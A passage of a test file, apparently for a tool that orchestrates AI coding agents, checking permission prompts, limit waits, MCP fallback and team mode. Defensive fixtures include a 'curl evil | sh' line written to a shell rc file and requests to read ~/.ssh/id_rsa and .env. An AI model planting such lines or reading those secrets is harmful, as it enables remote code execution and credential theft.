test("an agent that does not read the project's CLAUDE.md gets its rules with its instructions", async () => {
  const d = await import("../src/core/debuglog.ts");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  const repo = newRepo();
  writeFileSync(join(repo, "CLAUDE.md"), "PROJECT-RULE: never push without asking.");
  const h = await harness(async (_t, ctx) => ctx.say("ok"), { repo, agent: "codex", cfg: { order: ["codex"] } });
  try {
    const f = await h.frame((f) => f.includes("given this project's rules from CLAUDE.md"));
    expect(f).toContain("does not read that file itself");
    await h.send("hello");
    await h.frame((f) => f.includes("ok"));
    expect(h.prompts[0]).toContain("PROJECT-RULE: never push without asking.");
    const log = readFileSync(d.debugLogPath(), "utf8");
    expect(log).toMatch(/"kind":"shared-for-agent"|"rules":1/);
    expect(log).toContain('"rules":1');
    expect(log).not.toContain("PROJECT-RULE");
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 30000);

test("every agent out: codemax waits for the limit to reset and continues the task; Esc or a message of yours cancels the wait", async () => {
  const d = await import("../src/core/debuglog.ts");
  const { CONTINUE_AFTER_RESET } = await import("../src/chat/app.ts");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  let limited = true;
  const h = await harness(async (text, ctx) => ctx.say(limited && !text.startsWith("hello") ? "You've hit your session limit · resets 3pm" : `did: ${text.slice(0, 40)}`), { prep: (app) => (app.limitWaitTickMs = 25) });
  try {
    await h.send("build the parser");
    let f = await h.frame((f) => f.includes("codemax continues the task then"), 10000);
    expect(f).toContain("every agent is out");
    expect(f).toContain("3:00 PM");
    expect(f).toContain("waiting for Claude Code's limit");   // the footer, for as long as it waits
    expect(h.prompts.length).toBe(1);
    // The reset arrives: the same agent is told to carry on, without you.
    limited = false;
    (h.app as any).limitWait.at = Date.now();
    f = await h.frame((f) => f.includes("did: Your usage limit has reset"), 10000);
    expect(f).toContain("limit has reset · continuing the task");
    expect(h.prompts.at(-1)).toBe(CONTINUE_AFTER_RESET);
    expect((h.app as any).limitWait).toBeNull();
    // Out again: Esc ends the wait.
    limited = true;
    await h.send("now the lexer");
    await h.frame((f) => (f.match(/codemax continues the task then/g)?.length ?? 0) >= 2, 10000);
    h.setup.mockInput.pressEscape();
    await h.frame((f) => f.includes("no longer waiting for Claude Code's limit"));
    expect((h.app as any).limitWait).toBeNull();
    // Esc sticks: a later limit report while idle (Codex sends them) does not bring the wait back.
    (h.app as any).onQuota({ ...(h.app as any).quota.get("claude"), at: Date.now() });
    expect((h.app as any).limitWait).toBeNull();
    // And a message of yours does too (it is sent as usual).
    await h.send("and the tests");
    await h.frame((f) => f.includes("waiting for Claude Code's limit") && !!(h.app as any).limitWait, 10000);
    await h.send("hello again");
    await h.frame((f) => f.includes("did: hello again"));
    expect((h.app as any).limitWait).toBeNull();
    const log = readFileSync(d.debugLogPath(), "utf8");
    for (const k of ["limit-wait", "limit-wait-resume", "limit-wait-cancel"]) expect(log).toContain(`"kind":"${k}"`);
    expect(log).toContain('"why":"esc"');
    expect(log).toContain('"why":"message"');
    // A limit reported after a turn that finished its work leaves nothing to continue: no wait.
    (h.app as any).quota.delete("claude");
    (h.app as any).onQuota({ agent: "claude", exhausted: true, resetsAt: Date.now() + 3600_000, source: "probe", at: Date.now() });
    await h.frame((f) => f.includes("no other agent is available"));
    expect((h.app as any).limitWait).toBeNull();
    (h.app as any).quota.delete("claude");
    // /config → When every agent is out → stop: no wait.
    (h.app as any).config.waitForReset = false;
    limited = true;
    const sent = h.prompts.length;
    await h.send("one more");
    await h.frame(() => h.prompts.length > sent && !(h.app as any).active.turn, 10000);
    await Bun.sleep(150);
    expect((h.app as any).limitWait).toBeNull();
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 60000);

test("full auto: with ask, only a change outside the project and anything where secrets live still ask; without ask, nothing does", async () => {
  const d = await import("../src/core/debuglog.ts");
  const { homedir } = await import("node:os");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  const outcomes: string[] = [];
  const two = [{ optionId: "always", name: "Always", kind: "allow_always" }, { optionId: "allow", name: "Allow", kind: "allow_once" }, { optionId: "reject", name: "Reject", kind: "reject_once" }];
  let repo = "";
  const h = await harness(async (text, ctx) => {
    const ask = async (toolCall: any) => outcomes.push(`${toolCall.toolCallId}:${((await ctx.conn.requestPermission({ sessionId: ctx.sessionId, toolCall, options: two } as any)).outcome as any).optionId}`);
    if (text === "work") {
      await ask({ toolCallId: "edit-in", title: "Edit a.ts", kind: "edit", rawInput: { file_path: join(repo, "a.ts"), old_string: "a", new_string: "b" } });
      await ask({ toolCallId: "run", title: "npm test", kind: "execute", rawInput: { command: "npm test" } });
      await ask({ toolCallId: "edit-out", title: "Edit /etc/hosts", kind: "edit", rawInput: { file_path: "/etc/hosts", old_string: "a", new_string: "b" } });
      await ask({ toolCallId: "read-secret", title: "Read id_rsa", kind: "read", locations: [{ path: join(homedir(), ".ssh", "id_rsa") }] });
      await ask({ toolCallId: "no-kind-out", title: "Write /etc/motd", rawInput: { file_path: "/etc/motd" } });   // no kind given: still a file outside the project
      await ask({ toolCallId: "read-out", title: "Read /etc/hosts", kind: "read", rawInput: { file_path: "/etc/hosts" } });   // only reads: goes through
    } else if (text === "again") await ask({ toolCallId: "later", title: "Edit a.ts", kind: "edit", rawInput: { file_path: join(repo, "a.ts") } });
    await ctx.say(`finished ${text}`);
  });
  repo = h.repo;
  try {
    await h.send("/auto ask");
    let f = await h.frame((f) => f.includes("full auto on (with ask)"));
    expect(f).toContain("Shell commands run without asking");   // said when it is turned on
    expect(f).toContain("asks only outside the project");   // the footer says so for as long as it is on
    await h.send("work");
    // Inside the project nothing asked (allowed once, never "always"); the change outside it does.
    f = await h.frame((f) => f.includes("Edit /etc/hosts") && f.includes("Do you want"));
    expect(outcomes).toEqual(["edit-in:allow", "run:allow"]);
    await h.setup.mockInput.typeText("3");
    h.setup.mockInput.pressEnter();
    // So does a read where secrets live.
    await h.frame((f) => f.includes("Read id_rsa") && f.includes("Do you want"));
    expect(outcomes.at(-1)).toBe("edit-out:reject");
    await h.setup.mockInput.typeText("2");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("Write /etc/motd") && f.includes("Do you want"));
    expect(outcomes.at(-1)).toMatch(/^read-secret:(allow|always)$/);
    await h.setup.mockInput.typeText("3");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("finished work"));
    expect(outcomes.slice(-2)).toEqual(["no-kind-out:reject", "read-out:allow"]);
    const log = readFileSync(d.debugLogPath(), "utf8");
    expect(log).toContain('"kind":"full-auto"');
    expect(log.match(/"answer":"auto"/g)?.length).toBe(3);
    // Off again: the next request asks.
    await h.send("/auto off");
    await h.frame((f) => f.includes("full auto off"));
    await h.send("again");
    await h.frame((f) => f.includes("Do you want") && !f.includes("full auto on ·"));
    expect(outcomes.some((o) => o.startsWith("later"))).toBe(false);
    await h.setup.mockInput.typeText("2");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("finished again"));
    // Without ask: the change outside the project and the read of a secret go through too.
    await h.send("/auto all");
    f = await h.frame((f) => f.includes("full auto on (without ask)"));
    expect(f).toContain("nothing asks");
    const before = outcomes.length;
    await h.send("work");
    await h.frame((f) => (f.match(/finished work/g)?.length ?? 0) >= 1 && outcomes.length === before + 6, 10000);
    expect(outcomes.slice(before)).toEqual(["edit-in:allow", "run:allow", "edit-out:allow", "read-secret:allow", "no-kind-out:allow", "read-out:allow"]);
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 40000);

/** An Antigravity home whose MCP config has the IDE's data-agent-kit proxy, one good server and one turned off with `agy mcp disable`. */
function geminiHomeWithIdeServer() {
  const base = mkdtempSync(join(tmpdir(), "codemax-gemini-"));
  mkdirSync(join(base, "config", "plugins", "some-plugin"), { recursive: true });
  mkdirSync(join(base, "antigravity-acp", "conversations"), { recursive: true });
  writeFileSync(join(base, "antigravity-acp", "settings.json"), '{"auth":{"type":"oauth-personal"}}');
  writeFileSync(join(base, "GEMINI.md"), "my rules");
  writeFileSync(join(base, "config", "config.json"), '{"plugins":{}}');
  const config = JSON.stringify({ mcpServers: {
    "data-agent-kit": { command: "node", args: ["/ide/ext/mcp_proxy_bundle.js", "dataAgentKit-antigravityide"] },
    good: { command: "npx", args: ["-y", "good-mcp"], env: { TOKEN: "SECRET-TOKEN-1" } },
    off: { command: "npx", args: ["off-mcp"], disabled: true },
  } }, null, 2);
  writeFileSync(join(base, "config", "mcp_config.json"), config);
  return { base, config, file: join(base, "config", "mcp_config.json") };
}
const REFUSAL = "The MCP server 'data-agent-kit' failed to initialize: [MCP Proxy] Socket connection error: connect ENOENT /tmp/datacloud-mcp-dataAgentKit-antigravityide.sock: connection closed: calling \"initialize\": client is closing: EOF. Fix the MCP server, or remove it from your configuration and start a new session, to continue.";

test("Antigravity refusing every turn over an MCP server of its own that cannot start: codemax leaves the server out, restarts it and asks again", async () => {
  const ag = await import("../src/engines/antigravity.ts");
  const d = await import("../src/core/debuglog.ts");
  const g = geminiHomeWithIdeServer();
  ag.unskipAntigravityMcp("data-agent-kit");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  // Like Google's ACP server: it refuses while the server is in the config it was started with.
  const starts: (string[] | null)[] = [];
  const h = await harness(async (_text, ctx) => ctx.say(ag.antigravityLeftOut(g.base).some((l) => l.name === "data-agent-kit") ? "antigravity did it" : REFUSAL), {
    agent: "antigravity",
    cfg: { order: ["antigravity"] },
    prep: (app) => {
      app.geminiBase = g.base;
      const make = app.engineFactory;
      app.engineFactory = (agent: string) => {
        const home = ag.antigravityHome(g.base)?.home;
        starts.push(home ? Object.keys(JSON.parse(readFileSync(join(home, "config", "mcp_config.json"), "utf8")).mcpServers) : null);
        return make(agent);
      };
    },
  });
  try {
    await h.send("build the parser");
    let f = await h.frame((f) => f.includes("antigravity did it"), 15000);
    expect(f).toContain("did not start (it belongs to the Antigravity IDE");
    expect(f).toContain("/mcp enable data-agent-kit");
    expect(f).not.toContain("won't work until");
    // The same request went again, to an agent started in codemax's linked home.
    expect(h.prompts.filter((p) => p.includes("build the parser")).length).toBe(2);
    // The first start ran in Antigravity's own home; the second in codemax's linked one.
    expect(starts).toEqual([null, ["good"]]);
    const home = ag.antigravityHome(g.base)!.home;
    // That home: the user's own files as links, and an MCP config without the servers left out.
    expect(readFileSync(join(home, "GEMINI.md"), "utf8")).toBe("my rules");
    expect(realpathSync(join(home, "antigravity-acp"))).toBe(realpathSync(join(g.base, "antigravity-acp")));
    expect(realpathSync(join(home, "config", "plugins"))).toBe(realpathSync(join(g.base, "config", "plugins")));
    // The user's own config is never touched.
    expect(readFileSync(g.file, "utf8")).toBe(g.config);
    // The refusal is no answer; the retry's reply is.
    const answers = h.ledger.turns().filter((t: any) => t.role === "assistant").map((t: any) => t.text);
    expect(answers).toEqual(["antigravity did it"]);
    const log = readFileSync(d.debugLogPath(), "utf8");
    expect(log).toContain('"kind":"mcp-left-out"');
    expect(log).toContain('"kind":"agent-restart"');
    expect(log).toContain('"kind":"mcp-left-out-retry"');
    expect(log).toContain('"kind":"antigravity-home"');
    expect(log).not.toContain("SECRET-TOKEN-1");
    expect(log).not.toContain("data-agent-kit");
    // /mcp lists it, and enabling it starts the agent with it again.
    await h.send("/mcp enable data-agent-kit");
    f = await h.frame((f) => f.includes("data-agent-kit is back for"), 10000);
    await h.frame((f) => f.includes("resumed"), 10000);
    expect(ag.antigravityLeftOut(g.base).map((l) => l.name)).toEqual(["off"]);
    expect(ag.antigravityHome(g.base)).toBeNull();
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 40000);

test("an agent that still refuses after its server was left out is not asked a third time: the task goes on to a handoff", async () => {
  const g = geminiHomeWithIdeServer();
  (await import("../src/engines/antigravity.ts")).unskipAntigravityMcp("data-agent-kit");
  const h = await harness(async (_text, ctx) => ctx.say(REFUSAL), { agent: "antigravity", cfg: { order: ["antigravity"] }, prep: (app) => (app.geminiBase = g.base) });
  try {
    await h.send("build the parser");
    const f = await h.frame((f) => f.includes("won't work until its MCP server"), 15000);
    expect(f).toContain("`agy mcp remove");
    expect(h.prompts.filter((p) => p.includes("build the parser")).length).toBe(2);
    expect(readFileSync(g.file, "utf8")).toBe(g.config);
  } finally { await h.cleanup(); }
}, 40000);

test("Antigravity's linked home: rebuilt at each start, follows the real one, and never removes anything from it", async () => {
  const ag = await import("../src/engines/antigravity.ts");
  const g = geminiHomeWithIdeServer();
  ag.unskipAntigravityMcp("data-agent-kit");
  // No server failed: the agent runs in its own home (one turned off with `agy mcp disable` does not change that).
  expect(ag.antigravityHome(g.base)).toBeNull();
  expect(ag.antigravityLeftOut(g.base).map((l) => `${l.name}:${l.why}`)).toEqual(["off:disabled"]);
  // A server that did not start is left out while its setup stays the one that failed.
  expect(ag.skipAntigravityMcp("nope", g.base)).toBe(false);
  expect(ag.skipAntigravityMcp("Data-Agent-Kit", g.base)).toBe(true);
  writeFileSync(join(g.base, "notes.txt"), "new file");
  rmSync(join(g.base, "GEMINI.md"));
  let o = ag.antigravityHome(g.base)!;
  expect(o.left.map((l) => `${l.name}:${l.why}:${l.needsIde}`)).toEqual(["data-agent-kit:failed:true", "off:disabled:false"]);
  expect(readFileSync(join(o.home, "notes.txt"), "utf8")).toBe("new file");
  expect(existsSync(join(o.home, "GEMINI.md"))).toBe(false);
  // What the agent writes there lands in the real home.
  writeFileSync(join(o.home, "antigravity-acp", "conversations", "c1.db"), "x");
  expect(existsSync(join(g.base, "antigravity-acp", "conversations", "c1.db"))).toBe(true);
  expect(readFileSync(join(g.base, "antigravity-acp", "settings.json"), "utf8")).toContain("oauth-personal");
  expect(readFileSync(g.file, "utf8")).toBe(g.config);
  // Windows without Developer Mode refuses links to files: a hard link (or a copy) stands in, made again at each start.
  const noFileLinks = (target: string, path: string, type: "dir" | "file" | "junction") => {
    if (type === "file") throw Object.assign(new Error("EPERM: operation not permitted, symlink"), { code: "EPERM" });
    symlinkSync(target, path, type);
  };
  for (const n of readdirSync(o.home)) if (lstatSync(join(o.home, n)).isSymbolicLink() && !statSync(join(o.home, n)).isDirectory()) rmSync(join(o.home, n));
  o = ag.antigravityHome(g.base, noFileLinks)!;
  expect(lstatSync(join(o.home, "notes.txt")).isSymbolicLink()).toBe(false);
  expect(readFileSync(join(o.home, "notes.txt"), "utf8")).toBe("new file");
  rmSync(join(g.base, "notes.txt"));
  writeFileSync(join(g.base, "notes.txt"), "replaced");   // a save that replaces the file, as editors do
  writeFileSync(join(g.base, "installation_id"), "id-1");
  o = ag.antigravityHome(g.base, noFileLinks)!;
  expect(readFileSync(join(o.home, "notes.txt"), "utf8")).toBe("replaced");
  expect(readFileSync(join(o.home, "installation_id"), "utf8")).toBe("id-1");
  rmSync(join(g.base, "installation_id"));
  o = ag.antigravityHome(g.base, noFileLinks)!;
  expect(existsSync(join(o.home, "installation_id"))).toBe(false);
  expect(readFileSync(join(g.base, "notes.txt"), "utf8")).toBe("replaced");
  expect(existsSync(join(g.base, "antigravity-acp", "conversations", "c1.db"))).toBe(true);
  expect(readFileSync(g.file, "utf8")).toBe(g.config);
  // A changed setup (the user fixed it) is tried again; with nothing left out there is no linked home.
  const fixed = JSON.parse(g.config);
  fixed.mcpServers["data-agent-kit"].args = ["fixed"];
  delete fixed.mcpServers.off;
  writeFileSync(g.file, JSON.stringify(fixed));
  expect(ag.antigravityHome(g.base)).toBeNull();
  expect(existsSync(join(g.base, "antigravity-acp", "conversations", "c1.db"))).toBe(true);
});

test("long sessions look for an update again (30 min, then 1 h, 2 h… doubling) and show it on the prompt's top border", async () => {
  const calls: { at: number; force?: boolean }[] = [];
  const t0 = Date.now();
  const h = await harness(async (_t, ctx) => ctx.say("hi"), {
    prep: (app) => {
      app.updateRecheckMs = 60; // stands in for 30 minutes
      app.updateChecker = async (_current: string, force?: boolean) => {
        calls.push({ at: Date.now() - t0, force });
        return calls.length >= 3 ? "9.9.9" : null;
      };
    },
  });
  try {
    const f = await h.frame((f) => f.includes("↑ codemax 9.9.9 available · /update"), 5000);
    // On the border line just above the prompt, at its right end.
    const lines = f.split("\n");
    const promptAt = lines.findIndex((l) => l.startsWith("❯ "));
    expect(lines[promptAt - 1]).toMatch(/─ ↑ codemax 9\.9\.9 available · \/update ─*$/);
    expect(f).toContain("codemax 9.9.9 is available");
    // The startup check uses the cache; the re-checks ask the source directly, each twice as late.
    expect(calls.map((c) => c.force)).toEqual([undefined, true, true]);
    const gap1 = calls[1]!.at - calls[0]!.at, gap2 = calls[2]!.at - calls[1]!.at;
    // Timers run a little early or late (Windows): check the doubling, not exact milliseconds.
    expect(gap1).toBeGreaterThanOrEqual(40);
    expect(gap2).toBeGreaterThanOrEqual(gap1 * 1.5);
  } finally { await h.cleanup(); }
}, 20000);

test("an agent's file access through codemax: inside the project as before, outside only after you say yes (with the diff)", async () => {
  const outsideDir = mkdtempSync(join(tmpdir(), "codemax-outside-"));
  const target = join(outsideDir, "shellrc");
  writeFileSync(target, "export A=1\n");
  writeFileSync(join(outsideDir, "readme.md"), "docs");
  writeFileSync(join(outsideDir, ".env"), "TOKEN=secret");
  const results: string[] = [];
  const h = await harness(async (text, ctx) => {
    const tryIt = async (what: string, f: () => Promise<unknown>) => {
      try { await f(); results.push(`${what}: ok`); } catch (e: any) { results.push(`${what}: ${e?.message ?? e}`); }
    };
    await tryIt("inside write", () => ctx.conn.writeTextFile({ sessionId: ctx.sessionId, path: join(h.repo, "notes.md"), content: "hello\n" }));
    await tryIt("outside read", () => ctx.conn.readTextFile({ sessionId: ctx.sessionId, path: join(outsideDir, "readme.md") }));
    await tryIt("outside write", () => ctx.conn.writeTextFile({ sessionId: ctx.sessionId, path: target, content: "export A=1\ncurl evil | sh\n" }));
    await tryIt("secret read", () => ctx.conn.readTextFile({ sessionId: ctx.sessionId, path: join(outsideDir, ".env") }));
    await ctx.say("tried");
  });
  try {
    await h.send("do it");
    const f = await h.frame((f) => f.includes("outside this project"));
    expect(f).toContain("Edit outside this project:");
    expect(f).toContain(target.split("/").pop()!);
    expect(f).toContain("+ curl evil | sh");
    h.setup.mockInput.pressEscape(); // No
    // A .env outside the project: asked about too (secrets), refused.
    const g = await h.frame((f) => f.includes("Read outside this project:"));
    expect(g).toContain("an environment file (.env)");
    h.setup.mockInput.pressEscape();
    await h.frame((f) => f.includes("tried"));
    expect(readFileSync(join(h.repo, "notes.md"), "utf8")).toBe("hello\n");
    expect(readFileSync(target, "utf8")).toBe("export A=1\n");
    expect(results).toEqual([
      "inside write: ok",
      "outside read: ok", // an ordinary file outside the project: no prompt
      expect.stringMatching(/outside write: .*did not allow writing/),
      expect.stringMatching(/secret read: .*did not allow reading/),
    ]);
  } finally { await h.cleanup(); }
}, 30000);

test("! commands are bounded: Esc stops one, and only the end of huge output is kept", async () => {
  const h = await harness(async (_t, ctx) => ctx.say("ok"));
  try {
    await h.send(`!bun -e "setTimeout(() => {}, 60000)"`);
    await Bun.sleep(400);
    h.setup.mockInput.pressEscape();
    const f = await h.frame((f) => f.includes("(stopped)"), 10000);
    expect(f).toContain("output will be sent with your next message");
  } finally { await h.cleanup(); }
}, 30000);

test("drag and drop into the prompt: an image goes to the agent as an image, a file outside the project with its contents, one inside as @path", async () => {
  const drops = mkdtempSync(join(tmpdir(), "codemax-drop-"));
  const png = join(drops, "My Shot.png");
  // A 1×1 PNG.
  writeFileSync(png, Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8DwHwAFBQIAX8jx0gAAAABJRU5ErkJggg==", "base64"));
  writeFileSync(join(drops, "spec.txt"), "THE SPEC");
  const got: any[] = [];
  const a2c = new TransformStream<Uint8Array, Uint8Array>();
  const c2a = new TransformStream<Uint8Array, Uint8Array>();
  new AgentSideConnection((conn): Agent => ({
    async initialize() { return { protocolVersion: 1, agentCapabilities: { promptCapabilities: { image: true } }, authMethods: [] } as any; },
    async newSession() { return { sessionId: "s" } as any; },
    async authenticate() { return {}; },
    async prompt({ sessionId, prompt }) {
      got.push(prompt);
      await conn.sessionUpdate({ sessionId, update: { sessionUpdate: "agent_message_chunk", content: { type: "text", text: "seen" } } as any });
      return { stopReason: "end_turn" } as any;
    },
    async cancel() {},
  }), ndJsonStream(a2c.writable, c2a.readable));
  const h = await harness(async () => {}, {
    prep: (app) => { app.engineFactory = (agent: string) => new AcpEngine({ agent: agent as any, name: agent, cmd: [], stream: ndJsonStream(c2a.writable, a2c.readable) }); },
  });
  try {
    writeFileSync(join(h.repo, "app.ts"), "code");
    await h.setup.mockInput.typeText("compare ");
    // What Terminal.app pastes when three files are dropped at once (Windows Terminal quotes them).
    const shot = process.platform === "win32" ? `"${png}"` : png.replace(/ /g, "\\ ");
    await h.setup.mockInput.pasteBracketedText(`${shot} ${join(drops, "spec.txt")} ${join(h.repo, "app.ts")}`);
    let f = await h.frame((f) => f.includes("[Image #1]"));
    expect((h.app as any).input.plainText).toBe("compare [Image #1] [File #2: spec.txt] @app.ts ");
    h.setup.mockInput.pressEnter();
    f = await h.frame((f) => f.includes("seen"));
    expect(f).toContain("attached 1 image: My Shot.png");
    const [blocks] = got;
    expect(blocks[0].text).toContain("[Image #1] is the attached image " + png);
    expect(blocks[0].text).toContain("THE SPEC");
    expect(blocks[0].text).toContain("code"); // @app.ts, inside the project
    expect(blocks[1]).toMatchObject({ type: "image", mimeType: "image/png" });
    expect(blocks[1].data.length).toBeGreaterThan(20);
    // An ordinary paste stays text.
    await h.setup.mockInput.pasteBracketedText("just some words");
    await h.frame(() => (h.app as any).input.plainText === "just some words");
  } finally { await h.cleanup(); }
}, 30000);

test("automatic handoff never hands the task to an agent that edits without asking (Cursor) without your Enter", async () => {
  const h = await harness(async (text, ctx) => {
    if (ctx.agent === "claude" && text.startsWith("work")) throw new Error("You've hit your usage limit · resets 3pm");
    await ctx.say(`${ctx.agent} did it`);
  }, { cfg: { autoHandoff: true, order: ["claude", "cursor"] }, height: 40 });
  (h.app as any).detect.set("cursor", { installed: true, version: "t", engine: true });
  try {
    await h.send("work on it");
    const f = await h.frame((f) => f.includes("waits for your Enter") && f.includes("Continue in Cursor"), 15000);
    expect(f).not.toContain("handing off to");
    h.setup.mockInput.pressEnter();
    await h.frame((f) => f.includes("cursor did it"), 15000);
  } finally { await h.cleanup(); }
}, 30000);

test("/team: a lead splits the task, agents build the parts at once in their own copies, the parts are merged and the lead checks", async () => {
  const d = await import("../src/core/debuglog.ts");
  if (existsSync(d.debugLogPath())) rmSync(d.debugLogPath());
  d.setDebugLog(true);
  const repo = newRepo();
  writeFileSync(join(repo, "notes.txt"), "uncommitted work\n");   // the copies start from your files as they are, not from the last commit
  const copies: Record<string, string> = {};
  const asked: string[] = [];
  let clash = false;
  // Git on Windows checks text files out with CRLF line endings: the words are what is compared.
  const lf = (file: string) => readFileSync(file, "utf8").replace(/\r\n/g, "\n");
  const h = await harness(async (text, ctx) => {
    if (text.includes("split the task into")) {
      // The lead only plans: an edit it asks for is refused.
      const r: any = await ctx.conn.requestPermission({ sessionId: ctx.sessionId, toolCall: { toolCallId: "lead-edit", title: "Edit README.md", kind: "edit" }, options: opts } as any);
      asked.push(`lead:${r.outcome.optionId}`);
      return ctx.say('Two independent halves.\n```json\n{"parts": [{"title": "the parser", "files": ["src/parser.ts"], "task": "Write src/parser.ts exporting parse()."}, {"title": "the printer", "files": ["src/printer.ts"], "task": "Write src/printer.ts exporting print()."}]}\n```');
    }
    if (text.includes("YOUR PART")) {
      const mine = text.includes("YOUR PART: the parser") ? "parser" : "printer";
      copies[mine] = ctx.cwd!;
      expect(lf(join(ctx.cwd!, "notes.txt"))).toBe("uncommitted work\n");
      // Nothing run in a copy can reach your repository: the clone's remote is removed.
      expect(Bun.spawnSync(["git", "remote"], { cwd: ctx.cwd! }).stdout.toString().trim()).toBe("");
      const r: any = await ctx.conn.requestPermission({ sessionId: ctx.sessionId, toolCall: { toolCallId: `w-${mine}`, title: `Write src/${mine}.ts`, kind: "edit", rawInput: { file_path: join(ctx.cwd!, "src", `${mine}.ts`) } }, options: opts } as any);
      asked.push(`${mine}:${r.outcome.optionId}`);
      mkdirSync(join(ctx.cwd!, "src"), { recursive: true });
      writeFileSync(join(ctx.cwd!, "src", `${mine}.ts`), `export const ${mine} = "${ctx.agent}";\n`);
      if (clash) writeFileSync(join(ctx.cwd!, "README.md"), `${mine} was here\n`);
      return ctx.say(`Wrote src/${mine}.ts.\nNEEDS: nothing`);
    }
    if (text.includes("which naming")) return ctx.say("DECISION-7: snake_case everywhere.");
    return ctx.say(text.startsWith("[codemax team]") ? "checked the combined work" : `did: ${text.slice(0, 30)}`);
  }, { repo, prep: (app) => (app as any).detect?.set?.("codex", { installed: true, version: "t", engine: true }) });
  (h.app as any).detect.set("codex", { installed: true, version: "t", engine: true });
  const git = (...a: string[]) => Bun.spawnSync(["git", ...a], { cwd: repo }).stdout.toString();
  const refsBefore = git("for-each-ref", "refs/heads", "refs/tags", "HEAD");
  try {
    await h.send("/auto ask");   // the workers are not asked inside their copies; the lead's split is refused whatever the mode
    await h.frame((f) => f.includes("full auto on (with ask)"));
    void (h.app as any).runTeam([{ agent: "claude" }, { agent: "codex" }], "build the parser and the printer");
    let f = await h.frame((f) => f.includes("Build these 2 parts at the same time?"), 15000);
    expect(f).toContain("1. the parser");
    expect(f).toContain("src/printer.ts");
    expect(asked).toEqual(["lead:reject"]);
    expect(existsSync(join(repo, "src"))).toBe(false);   // nothing built before you accept
    h.setup.mockInput.pressEnter();
    f = await h.frame((f) => f.includes("checked the combined work"), 20000);
    // Each part was built in its own copy, outside the project, and merged into it.
    expect(copies.parser).not.toBe(copies.printer);
    expect(copies.parser!.startsWith(repo)).toBe(false);
    expect(lf(join(repo, "src", "parser.ts"))).toBe('export const parser = "claude";\n');
    expect(lf(join(repo, "src", "printer.ts"))).toBe('export const printer = "codex";\n');
    expect(asked.sort()).toEqual(["lead:reject", "parser:allow", "printer:allow"]);
    // Your git state is as it was: no commit, nothing staged, no branch or worktree added; the copies are gone.
    expect(git("for-each-ref", "refs/heads", "refs/tags", "HEAD")).toBe(refsBefore);
    expect(git("diff", "--cached", "--name-only")).toBe("");
    expect(git("worktree", "list").trim().split("\n").length).toBe(1);
    expect(existsSync(copies.parser!)).toBe(false);
    // The lead (your agent) got the result to check, as an ordinary turn.
    const lead = h.prompts.find((p) => p.startsWith("[codemax team] The task below was split"))!;
    expect(lead).toContain("Part 1: the parser (Claude Code) · finished · merged, 1 file: src/parser.ts");
    expect(lead).toContain("NEEDS: nothing");
    const log = readFileSync(d.debugLogPath(), "utf8");
    for (const k of ["team-start", "team-split", "team-worker-end", "team-merge", "team-end"]) expect(log).toContain(`"kind":"${k}"`);
    expect(log).not.toContain("the parser");
    // Two parts that changed the same file: the first merges, the second is kept as a patch for the lead to apply by hand.
    clash = true;
    Bun.spawnSync(["sh", "-c", "rm -rf src"], { cwd: repo });
    // A decision made in a reply, two requests before the next team.
    await h.send("which naming do we use?");
    await h.frame((f) => f.includes("DECISION-7"));
    await h.send("fine, thanks");
    await h.frame((f) => f.includes("did: fine, thanks"));
    void (h.app as any).runTeam([{ agent: "claude" }, { agent: "codex" }], "again, with a clash");
    await h.frame((f) => f.includes("Build these 2 parts at the same time?"), 15000);
    h.setup.mockInput.pressEnter();
    await h.frame(() => h.prompts.filter((p) => p.startsWith("[codemax team] The task below was split")).length === 2, 20000);
    const second = h.prompts.filter((p) => p.startsWith("[codemax team] The task below was split")).at(-1)!;
    const patch = second.match(/its patch is at (\S+\.patch)/)?.[1];
    expect(patch).toBeTruthy();
    expect(readFileSync(patch!, "utf8")).toContain("was here");
    expect(second).toContain("Apply each patch that was not applied by hand");
    // No context is lost on the way to the team: the split was made in your agent's own session, and each
    // worker's brief came after codemax's record of the work so far (marked as context, not as a task to take over).
    const sessions = (h.app as any).ledger.sessions();
    expect(sessions.claude?.id).toBeTruthy();
    const briefs = h.prompts.filter((p) => p.includes("YOUR PART"));
    expect(briefs.slice(0, 2).every((p) => p.startsWith("[codemax team]"))).toBe(true);   // the first team: nothing had been said yet
    expect(briefs.slice(2).every((p) => p.includes("Context only") && p.indexOf("Context only") < p.indexOf("YOUR PART"))).toBe(true);
    expect(briefs.at(-1)).toContain("DECISION-7: snake_case everywhere.");   // what an agent answered two requests ago
    expect(briefs.at(-1)!.indexOf("DECISION-7")).toBeLessThan(briefs.at(-1)!.indexOf("YOUR PART"));
    expect(log + readFileSync(d.debugLogPath(), "utf8")).toContain('"kind":"team-context"');
    expect(lf(join(repo, "README.md"))).toMatch(/^(parser|printer) was here\n$/);
    expect([existsSync(join(repo, "src", "parser.ts")), existsSync(join(repo, "src", "printer.ts"))].filter(Boolean).length).toBe(1);   // a patch applies whole or not at all
  } finally { d.setDebugLog(false); await h.cleanup(); }
}, 60000);

test("a message that asks to share the work out opens /team with the agents it names; Esc sends it as an ordinary message", async () => {
  const { teamIntent } = await import("../src/core/team.ts");
  // Wording that asks for several agents to share the work.
  for (const yes of ["split this between claude and codex", "Delegate the tests to Codex", "have the agents build this in parallel", "use a team for this refactor", "let cursor and gemini each take half", "delegate this to another agent", "divide the work among the agents and build the API", "please delegate the docs to the other agents", "build it as a team"]) expect([yes, !!teamIntent(yes)]).toEqual([yes, true]);
  // Ordinary requests that only sound like it, also where agents are what the work is about (as in this project).
